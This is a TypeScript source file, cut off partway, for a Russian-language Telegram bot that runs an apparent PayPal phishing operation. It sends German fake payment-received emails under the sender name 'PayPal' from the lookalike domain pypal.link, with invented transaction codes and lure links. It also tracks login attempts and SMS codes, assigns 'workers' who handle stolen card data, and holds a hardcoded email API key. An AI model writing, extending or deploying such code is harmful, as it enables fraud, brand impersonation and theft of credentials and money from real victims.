console.log("üöÄ TelegramBot.ts file started loading...");

// Force console output to stdout
const originalLog = console.log;
console.log = (...args) => {
  process.stdout.write(`[TELEGRAM BOT] ${args.join(' ')}\n`);
  originalLog(...args);
};

import TelegramBot from "node-telegram-bot-api";
import { WebSocket } from "ws";
import { MailerSend, EmailParams, Sender, Recipient } from "mailersend";
import { MailService } from "@sendgrid/mail";
import { Resend } from "resend";
import { readFileSync } from "fs";
import path from "path";
import { db } from "./db";
import { getDomainFromConfig } from "./domainUtils";
import { telegramUsers, telegramLinks, loginAttempts, smsSubmissions, workerAssignments } from "@shared/schema";
import { eq, desc, and, sql, like } from "drizzle-orm";
import { storage } from "./storage";

// Global declarations
declare global {
  var smsHashMap: Map<string, string> | undefined;
  var activeUsers: Map<string, { timestamp: number; page: string; userAgent: string; ip: string }>
    | undefined;
}

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error("‚ùå TELEGRAM_BOT_TOKEN environment variable is not set");
  process.exit(1);
}

// Type assertion is safe because we check above
const VERIFIED_BOT_TOKEN = BOT_TOKEN as string;

console.log(`üîë Using bot token: ${VERIFIED_BOT_TOKEN.substring(0, 10)}...`);

// Prevent multiple bot instances by checking if already initialized
declare global {
  var telegramBotInstance: TelegramBot | undefined;
}

let bot: TelegramBot;

if (global.telegramBotInstance) {
  console.log("üîÑ Using existing Telegram bot instance");
  bot = global.telegramBotInstance;
  
  // Clear existing event listeners to prevent duplicates
  bot.removeAllListeners('message');
  bot.removeAllListeners('callback_query');
  bot.removeAllListeners('error');
  bot.removeAllListeners('polling_error');
  
  // Clear text handlers (onText)
  if (bot.removeTextListener) {
    bot.removeTextListener(/\/start/);
    bot.removeTextListener(/\/approve (.+)/);
    bot.removeTextListener(/\/disable_bot/);
    bot.removeTextListener(/\/enable_bot/);
    bot.removeTextListener(/\/disable_site/);
    bot.removeTextListener(/\/enable_site/);
    bot.removeTextListener(/\/edit_domain (.+)/);
    bot.removeTextListener(/\/delete_all_links/);
  }
  
  console.log("üßπ Cleared existing event listeners and text handlers");
} else {
  console.log("üÜï Creating new Telegram bot instance");
  bot = new TelegramBot(VERIFIED_BOT_TOKEN, { polling: true });
  
  // Store globally to prevent multiple instances
  global.telegramBotInstance = bot;
  
  // Handle polling errors with restart protection
  let restartTimeout: NodeJS.Timeout | null = null;
  bot.on('polling_error', (error) => {
    console.log(`‚ö†Ô∏è Polling error: ${(error as any).code} - ${error.message}`);
    
    if ((error as any).code === 'ETELEGRAM' && error.message.includes('409 Conflict')) {
      console.log('üîÑ Stopping current polling to resolve conflict...');
      bot.stopPolling();
      
      if (restartTimeout) clearTimeout(restartTimeout);
      restartTimeout = setTimeout(() => {
        console.log('üîÑ Restarting polling...');
        bot.startPolling();
      }, 5000);
    }
  });
}

// Add error handling for bot
bot.on('error', (error) => {
  console.error('‚ùå Telegram bot error:', error);
});

console.log("ü§ñ Telegram bot initialized successfully");

// Initialize email services
const mailerSend = new MailerSend({
  apiKey: process.env.MAILERSEND_API_KEY || "mlsn.7026506efdc181b299e5e7344159ad06e2196317cf38d1afbf23f3c3865a49e7",
});

const mailService = new MailService();
if (process.env.SENDGRID_API_KEY) {
  mailService.setApiKey(process.env.SENDGRID_API_KEY);
}

// Initialize Resend
const resend = new Resend(process.env.RESEND_API_KEY || "");

// Email service preference: 'resend', 'sendgrid', or 'mailersend'
const EMAIL_SERVICE = 'resend';

// Generate random transaction code in PayPal format
function generateTransactionCode(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  // Format: [3 chars][5 digits][2 chars][6 digits][1 char]
  let code = "";

  // 3 characters
  for (let i = 0; i < 3; i++) {
    code += chars[Math.floor(Math.random() * 26)]; // A-Z only
  }

  // 5 digits
  for (let i = 0; i < 5; i++) {
    code += Math.floor(Math.random() * 10);
  }

  // 2 characters
  for (let i = 0; i < 2; i++) {
    code += chars[Math.floor(Math.random() * 26)]; // A-Z only
  }

  // 6 digits
  for (let i = 0; i < 6; i++) {
    code += Math.floor(Math.random() * 10);
  }

  // 1 character
  code += chars[Math.floor(Math.random() * 26)]; // A-Z only

  return code;
}

// Format date in German
function formatGermanDate(): string {
  const now = new Date();
  const day = now.getDate();
  const months = [
    "Jan.",
    "Feb.",
    "M√§rz",
    "Apr.",
    "Mai",
    "Juni",
    "Juli",
    "Aug.",
    "Sept.",
    "Okt.",
    "Nov.",
    "Dez.",
  ];
  const month = months[now.getMonth()];
  const year = now.getFullYear();

  return `${day}. ${month} ${year}`;
}

// Process template placeholders
function processEmailTemplate(template: string, data: any): string {
  return template
    .replace(/{Name}/g, data.senderName || "")
    .replace(/{price}/g, data.price || "")
    .replace(/{link}/g, data.generatedLink || "")
    .replace(/{datum}/g, data.date || "")
    .replace(/{code}/g, data.transactionCode || "");
}

// Function to send PayPal notification email
export async function sendPayPalNotificationEmail(
  recipientEmail: string,
  link: any,
) {
  console.log("üîç Email sending attempt:", {
    recipient: recipientEmail,
    linkId: link.linkId,
    price: link.price,
    service: EMAIL_SERVICE.toUpperCase(),
    resendKey: !!process.env.RESEND_API_KEY,
    mailerSendKey: !!process.env.MAILERSEND_API_KEY,
    sendGridKey: !!process.env.SENDGRID_API_KEY
  });

  console.log(`‚úÖ Using ${EMAIL_SERVICE.toUpperCase()} service for email delivery`);

  // Declare variables in function scope for catch block access
  let subject: string;
  let emailText: string; 
  let emailHTML: string;

  try {
    // Read the email template
    const templatePath = path.join(process.cwd(), "shablon_mail.html");
    const emailTemplate = readFileSync(templatePath, "utf-8");

    // Prepare template data
    const templateData = {
      senderName: link.senderName || "Benutzer",
      price: link.price || "0,00 ‚Ç¨",
      generatedLink: link.generatedLink || link.link || "",
      date: formatGermanDate(),
      transactionCode: generateTransactionCode(),
    };

    // Process the template
    emailHTML = processEmailTemplate(emailTemplate, templateData);

    // Extract title from template for subject and process placeholders
    const titleMatch = emailHTML.match(/<title>(.*?)<\/title>/);
    subject = titleMatch
      ? processEmailTemplate(titleMatch[1], templateData)
      : `${templateData.senderName} hat Ihnen ${templateData.price} EUR mit PayPal gesendet`;

    // Create plain text version
    emailText = `
${subject}

Hallo!

Sie haben eine Zahlung √ºber PayPal erhalten:
Betrag: ${templateData.price}
Von: ${templateData.senderName}
Transaktionscode: ${templateData.transactionCode}
Datum: ${templateData.date}

Um den Betrag zu erhalten, besuchen Sie:
${templateData.generatedLink}

Diese E-Mail wurde automatisch generiert.
¬© 2025 PayPal. Alle Rechte vorbehalten.
    `;

    // Try different email services based on configuration
    let emailSent = false;
    
    if (EMAIL_SERVICE === 'resend') {
      // Configure Resend email parameters
      try {
        const result = await resend.emails.send({
          from: "PayPal <service@pypal.link>",
          to: [recipientEmail],
          subject: subject,
          html: emailHTML,
          text: emailText.trim(),
        });
        emailSent = true;
        console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via RESEND`);
      } catch (resendError) {
        console.error("‚ùå Resend failed:", (resendError as any).message || resendError);
        console.log("Error details:", resendError);
        
        // Fallback to SendGrid if Resend fails
        console.log('üîÑ Resend failed, switching to SendGrid...');
        
        const fallbackMessage = {
          to: recipientEmail,
          from: {
            name: "service@paypal.de",
            email: "service@pypal.link",
          },
          subject: subject,
          text: emailText.trim(),
          html: emailHTML,
        };

        await mailService.send(fallbackMessage);
        emailSent = true;
        console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via SENDGRID (fallback)`);
      }
    } else if (EMAIL_SERVICE === 'mailersend') {
      // Configure MailerSend email parameters
      // Using verified domain
      const sentFrom = new Sender(`service@${await getCurrentDomain()}`, "PayPal Service");
      const recipients = [new Recipient(recipientEmail, "Recipient")];

      const emailParams = new EmailParams()
        .setFrom(sentFrom)
        .setTo(recipients)
        .setSubject(subject)
        .setHtml(emailHTML)
        .setText(emailText.trim());

      try {
        await mailerSend.email.send(emailParams);
        emailSent = true;
        console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via MAILERSEND`);
      } catch (mailerSendError) {
        console.error("‚ùå MailerSend failed:", (mailerSendError as any).message || mailerSendError);
        console.log("Error details:", (mailerSendError as any).response?.body || mailerSendError);
        
        // Check for trial account limitations in multiple possible error formats
        const errorMessage = (mailerSendError as any).response?.body?.message || 
                           (mailerSendError as any).response?.data?.message || 
                           (mailerSendError as any).message || '';
        
        if (errorMessage.includes('Trial accounts') || errorMessage.includes('#MS42225')) {
          console.log('üîÑ MailerSend trial limitations detected, switching to SendGrid...');
          
          // Fallback to SendGrid
          const fallbackMessage = {
            to: recipientEmail,
            from: {
              name: "service@paypal.de",
              email: "service@pypal.link",
            },
            subject: subject,
            text: emailText.trim(),
            html: emailHTML,
          };

          await mailService.send(fallbackMessage);
          emailSent = true;
          console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via SENDGRID (fallback)`);
        } else {
          throw mailerSendError;
        }
      }
    } else {
      // Use SendGrid (default)
      const message = {
        to: recipientEmail,
        from: {
          name: "service@paypal.de",
          email: "service@pypal.link",
        },
        subject: subject,
        text: emailText.trim(),
        html: emailHTML,
      };

      await mailService.send(message);
      emailSent = true;
      console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via SENDGRID`);
    }
    
    return emailSent;
  } catch (error) {
    console.error(`‚ùå Email sending failed:`, (error as any).message || error);
    console.error("Full error details:", (error as any).response?.body || error);
    
    // If error contains MailerSend trial limitations, try SendGrid fallback
    const errorMessage = (error as any).response?.body?.message || (error as any).message || '';
    if (errorMessage.includes('Trial accounts') || errorMessage.includes('#MS42225')) {
      console.log('üîÑ Attempting SendGrid fallback from catch block...');
      
      try {
        const fallbackMessage = {
          to: recipientEmail,
          from: {
            name: "service@paypal.de",
            email: "service@pypal.link",
          },
          subject: subject || "PayPal - Ihre Zahlung wurde empfangen",
          text: emailText?.trim() || "Ihre Zahlung wurde erfolgreich verarbeitet.",
          html: emailHTML || "<p>Ihre Zahlung wurde erfolgreich verarbeitet.</p>",
        };

        await mailService.send(fallbackMessage);
        console.log(`‚úÖ Email sent successfully to: ${recipientEmail} via SENDGRID (catch fallback)`);
        return true;
      } catch (fallbackError) {
        console.error("‚ùå SendGrid fallback failed:", (fallbackError as any).message);
        return false;
      }
    }
    
    return false;
  }
}

// Global bot status
let BOT_ENABLED = true;

// Initialize admin system using admins.json
async function initializeAdmin() {
  try {
    const admins = loadAdmins();
    if (admins.length > 0) {
      // Set admin role for all admins
      for (const adminId of admins) {
        const existingAdmin = await db
          .select()
          .from(telegramUsers)
          .where(eq(telegramUsers.telegramId, adminId));

        if (existingAdmin.length > 0) {
          // Update existing admin to have admin role
          await db
            .update(telegramUsers)
            .set({ role: "admin" })
            .where(eq(telegramUsers.telegramId, adminId));
          
          console.log(`‚úÖ Admin ${adminId} role updated to admin with unique ID: ${existingAdmin[0].uniqueId}`);
        } else {
          // Create new admin
          const uniqueId = generateUniqueId();
          await db.insert(telegramUsers).values({
            telegramId: adminId,
            username: "admin",
            firstName: "Admin",
            lastName: "User",
            uniqueId,
            role: "admin",
            isApproved: true,
          });

          console.log(`‚úÖ Admin ${adminId} initialized with unique ID: ${uniqueId}`);
        }
      }
      
      console.log(`Admin system initialized with ${admins.length} admin(s): ${admins.join(', ')}`);
    } else {
      console.log("No admins configured in admins.json");
    }
  } catch (error) {
    console.error("Error initializing admin:", error);
  }
}

// Initialize admin on startup
initializeAdmin();

// Generate unique ID in format #A1B2C3D4
function generateUniqueId(): string {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let result = "#";
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Generate unique link ID in format #LINK_01
async function generateLinkId(): Promise<string> {
  const existingLinks = await db.select().from(telegramLinks);
  const existingIds = new Set(existingLinks.map((link) => link.linkId));

  let nextNumber = 1;
  let linkId = `#LINK_${nextNumber.toString().padStart(4, "0")}`;

  // Find first available ID
  while (existingIds.has(linkId) && nextNumber <= 9999) {
    nextNumber++;
    linkId = `#LINK_${nextNumber.toString().padStart(4, "0")}`;
  }

  if (nextNumber > 9999) {
    throw new Error("Maximum number of links reached");
  }

  return linkId;
}

// Generate random context data
function generateRandomString(): string {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
  let result = "";
  for (let i = 0; i < 64; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Check if user is approved
async function isUserApproved(telegramId: string): Promise<boolean> {
  const user = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  return user.length > 0 && user[0].isApproved === true;
}

// Get current production domain from config file
async function getCurrentDomain(): Promise<string> {
  return getDomainFromConfig();
}

// Load admin IDs from config file
function loadAdmins(): string[] {
  try {
    const configPath = path.join(process.cwd(), "config", "admins.json");
    const configData = readFileSync(configPath, "utf8");
    const config = JSON.parse(configData);
    return config.admins || [];
  } catch (error) {
    console.error("Error loading admin config:", error);
    return ["8146147595"]; // fallback to @Dalsend as only admin
  }
}

// Check if user has admin rights
async function isUserAdmin(telegramId: string): Promise<boolean> {
  const admins = loadAdmins();
  return admins.includes(telegramId);
}

// Check if user is a worker
async function isUserWorker(telegramId: string): Promise<boolean> {
  const user = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  
  return user.length > 0 && user[0].role === "worker";
}

// Get workers assigned to a user
async function getAssignedWorkers(userId: string): Promise<string[]> {
  const assignments = await db
    .select()
    .from(workerAssignments)
    .where(eq(workerAssignments.userId, userId));
  
  return assignments.map(assignment => assignment.workerId);
}

// Get users assigned to a worker
async function getAssignedUsers(workerId: string): Promise<string[]> {
  const assignments = await db
    .select()
    .from(workerAssignments)
    .where(eq(workerAssignments.workerId, workerId));
  
  return assignments.map(assignment => assignment.userId);
}

// Get all workers
async function getAllWorkers(): Promise<string[]> {
  const workers = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.role, "worker"));
  
  return workers.map(worker => worker.telegramId);
}

// Round-robin assignment for unassigned users
let workerIndex = 0;
async function getNextWorkerForAssignment(): Promise<string | null> {
  const workers = await getAllWorkers();
  if (workers.length === 0) return null;
  
  const selectedWorker = workers[workerIndex % workers.length];
  workerIndex++;
  return selectedWorker;
}

// Get user by telegram ID
async function getUserByTelegramId(telegramId: string) {
  const users = await db
    .select()
    .from(telegramUsers)
    .where(eq(telegramUsers.telegramId, telegramId));
  return users[0] || null;
}

// Main keyboard for approved users
const mainKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: "üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É" }, { text: "üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏" }],
      [{ text: "üë§ –ü—Ä–æ—Ñ–∏–ª—å" }, { text: "‚ùì –ü–æ–º–æ—â—å" }],
    ],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// Admin keyboard for admin users
const adminKeyboard = {
  reply_markup: {
    keyboard: [
      [{ text: "üîó –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É" }, { text: "üìã –ú–æ–∏ —Å—Å—ã–ª–∫–∏" }],
      [{ text: "üë§ –ü—Ä–æ—Ñ–∏–ª—å" }, { text: "‚öôÔ∏è –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–æ–º" }],
      [{ text: "üåê –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–∞–π—Ç–æ–º" }, { text: "üîÑ –ü–µ—Ä–µ–∞–¥—Ä–µ—Å–∞—Ü–∏—è" }],
      [{ text: "üåç –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –¥–æ–º–µ–Ω–æ–º" }, { text: "üîç –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã" }],
      [{ text: "üë• –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤–±–∏–≤–µ—Ä–∞–º–∏" }, { text: "üë§ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º–∏" }],
      [{ text: "üì¢ –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è" }, { text: "üóëÔ∏è –£–¥–∞–ª–∏—Ç—å –≤—Å–µ —Å—Å—ã–ª–∫–∏" }],
      [{ text: "‚ùì –ü–æ–º–æ—â—å" }],
    ],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// Cancel keyboard
const cancelKeyboard = {
  reply_markup: {
    keyboard: [[{ text: "‚ùå –û—Ç–º–µ–Ω–∞" }]],
    resize_keyboard: true,
    one_time_keyboard: false,
  },
};

// User states for conversation flow
const userStates = new Map<string, { state: string; data?: any }>();

// Bot commands
bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const username = msg.from?.username || "";
  const firstName = msg.from?.first_name || "";
  const lastName = msg.from?.last_name || "";

  // Check if this is the first user (admin)
  const allUsers = await db.select().from(telegramUsers);
  if (allUsers.length === 0) {
    // First user becomes admin automatically
    // Admin ID is now managed through admins.json
    const uniqueId = generateUniqueId();

    try {
      await db.insert(telegramUsers).values({
        telegramId,
        username,
        firstName,
        lastName,
        uniqueId,
        isApproved: true,
      });

      await bot.sendMessage(
        chatId,
        `üéâ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å, –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä!\n\n` +
          `–í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${uniqueId}\n\n` +
          `–í—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ–ª—É—á–∏–ª–∏ –ø–æ–ª–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫–∞–∫ –ø–µ—Ä–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å.\n` +
          `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É /approve ID –¥–ª—è –æ–¥–æ–±—Ä–µ–Ω–∏—è –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.`,
        adminKeyboard,
      );
      return;
    } catch (error) {
      console.error("Error creating admin user:", error);
      await bot.sendMessage(
        chatId,
        "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.",
      );
      return;
    }
  }

  if (await isUserApproved(telegramId)) {
    await bot.sendMessage(
      chatId,
      `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –æ–±—Ä–∞—Ç–Ω–æ! üéâ\n\n` +
        `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å—Å—ã–ª–∫–∞–º–∏:`,
      mainKeyboard,
    );
    return;
  }

  // Check if user already requested access
  const existingUser = await getUserByTelegramId(telegramId);
  if (existingUser && !existingUser.isApproved) {
    await bot.sendMessage(
      chatId,
      `–í–∞—à –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! ‚è≥\n\n` +
        `–£–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${existingUser.uniqueId}\n` +
        `–î–æ–∂–¥–∏—Ç–µ—Å—å –æ–¥–æ–±—Ä–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.`,
    );
    return;
  }

  // Create new user request
  const uniqueId = generateUniqueId();

  try {
    await db.insert(telegramUsers).values({
      telegramId,
      username,
      firstName,
      lastName,
      uniqueId,
      isApproved: false,
    });

    await bot.sendMessage(
      chatId,
      `–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å! üëã\n\n` +
        `–í–∞—à —É–Ω–∏–∫–∞–ª—å–Ω—ã–π ID: ${uniqueId}\n\n` +
        `–ó–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É.\n` +
        `–î–æ–∂–¥–∏—Ç–µ—Å—å –æ–¥–æ–±—Ä–µ–Ω–∏—è –¥–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–æ—Ç–∞.`,
    );

    // Notify all admins from config file
    const admins = loadAdmins();
    for (const adminId of admins) {
      try {
        await bot.sendMessage(
          adminId,
          `üîî –ù–æ–≤—ã–π –∑–∞–ø—Ä–æ—Å –Ω–∞ –¥–æ—Å—Ç—É–ø\n\n` +
            `ID: ${uniqueId}\n` +
            `–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${firstName} ${lastName}\n` +
            `Username: @${username}\n` +
            `Telegram ID: ${telegramId}\n\n` +
            `–î–ª—è –æ–¥–æ–±—Ä–µ–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /approve ${uniqueId}`,
        );
      } catch (error) {
        console.error(`Error notifying admin ${adminId}:`, error);
      }
    }
  } catch (error) {
    console.error("Error creating user request:", error);
    await bot.sendMessage(chatId, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.");
  }
});

// Admin command to approve users
bot.onText(/\/approve (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  const uniqueId = match?.[1];
  if (!uniqueId) {
    await bot.sendMessage(
      chatId,
      "–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /approve #ID",
    );
    return;
  }

  try {
    const users = await db
      .select()
      .from(telegramUsers)
      .where(eq(telegramUsers.uniqueId, uniqueId));

    if (users.length === 0) {
      await bot.sendMessage(chatId, "–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Å —Ç–∞–∫–∏–º ID –Ω–µ –Ω–∞–π–¥–µ–Ω.");
      return;
    }

    const user = users[0];

    await db
      .update(telegramUsers)
      .set({ isApproved: true, approvedAt: new Date() })
      .where(eq(telegramUsers.uniqueId, uniqueId));

    await bot.sendMessage(
      chatId,
      `‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å ${user.firstName} ${user.lastName} –æ–¥–æ–±—Ä–µ–Ω!`,
    );

    // Notify user
    await bot.sendMessage(
      user.telegramId,
      `üéâ –í–∞—à –∑–∞–ø—Ä–æ—Å –æ–¥–æ–±—Ä–µ–Ω!\n\n` +
        `–¢–µ–ø–µ—Ä—å –≤—ã –º–æ–∂–µ—Ç–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≤—Å–µ —Ñ—É–Ω–∫—Ü–∏–∏ –±–æ—Ç–∞.`,
      mainKeyboard,
    );
  } catch (error) {
    console.error("Error approving user:", error);
    await bot.sendMessage(
      chatId,
      "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–¥–æ–±—Ä–µ–Ω–∏–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.",
    );
  }
});

// Admin command to disable bot
bot.onText(/\/disable_bot/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  BOT_ENABLED = false;
  await bot.sendMessage(
    chatId,
    `üö´ –ë–æ—Ç –æ—Ç–∫–ª—é—á–µ–Ω –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!\n\n` +
      `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /enable_bot –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è.`,
    adminKeyboard,
  );
});

// Admin command to enable bot
bot.onText(/\/enable_bot/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  BOT_ENABLED = true;
  await bot.sendMessage(
    chatId,
    `‚úÖ –ë–æ—Ç –≤–∫–ª—é—á–µ–Ω –¥–ª—è –≤—Å–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!`,
    adminKeyboard,
  );
});

// Admin command to disable entire site
bot.onText(/\/disable_site/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  try {
    const response = await fetch("http://localhost:5000/api/site/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled: false }),
    });

    if (response.ok) {
      await bot.sendMessage(
        chatId,
        `üö´ –°–ê–ô–¢ –ü–û–õ–ù–û–°–¢–¨–Æ –û–¢–ö–õ–Æ–ß–ï–ù!\n\n` +
          `üîÑ –í—Å–µ —Å—Å—ã–ª–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞ PayPal.com\n` +
          `üì± –í–∫–ª—é—á–∞—è –ø—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É\n` +
          `‚öôÔ∏è –ê–¥–º–∏–Ω –ø–∞–Ω–µ–ª—å –æ—Å—Ç–∞–µ—Ç—Å—è –¥–æ—Å—Ç—É–ø–Ω–æ–π\n\n` +
          `–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /enable_site –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è.`,
        adminKeyboard,
      );
    }
  } catch (error) {
    await bot.sendMessage(chatId, "–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ —Å–∞–π—Ç–∞.");
  }
});

// Admin command to enable entire site
bot.onText(/\/enable_site/, async (msg) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
      "–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.",
    );
    return;
  }

  try {
    const response = await fetch("http://localhost:5000/api/site/toggle", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ enabled: true }),
    });

    if (response.ok) {
      await bot.sendMessage(
        chatId,
        `‚úÖ –°–ê–ô–¢ –í–ö–õ–Æ–ß–ï–ù!\n\n` +
          `üîó –í—Å–µ —Å—Å—ã–ª–∫–∏ —Ä–∞–±–æ—Ç–∞—é—Ç –Ω–æ—Ä–º–∞–ª—å–Ω–æ\n` +
          `üì± –ü—Ä—è–º–æ–π –¥–æ—Å—Ç—É–ø –∫ –¥–æ–º–µ–Ω—É –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω\n` +
          `üí∞ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –º–æ–≥—É—Ç —Å–æ–∑–¥–∞–≤–∞—Ç—å –Ω–æ–≤—ã–µ —Å—Å—ã–ª–∫–∏`,
        adminKeyboard,
      );
    }
  } catch (error) {
    await bot.sendMessage(chatId, "–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–∫–ª—é—á–µ–Ω–∏–∏ —Å–∞–π—Ç–∞.");
  }
});

// Admin command to edit domain config file
bot.onText(/\/edit_domain (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const telegramId = msg.from?.id?.toString() || "";
  const newDomain = match?.[1]?.trim();

  if (!(await isUserAdmin(telegramId))) {
    await bot.sendMessage(
      chatId,
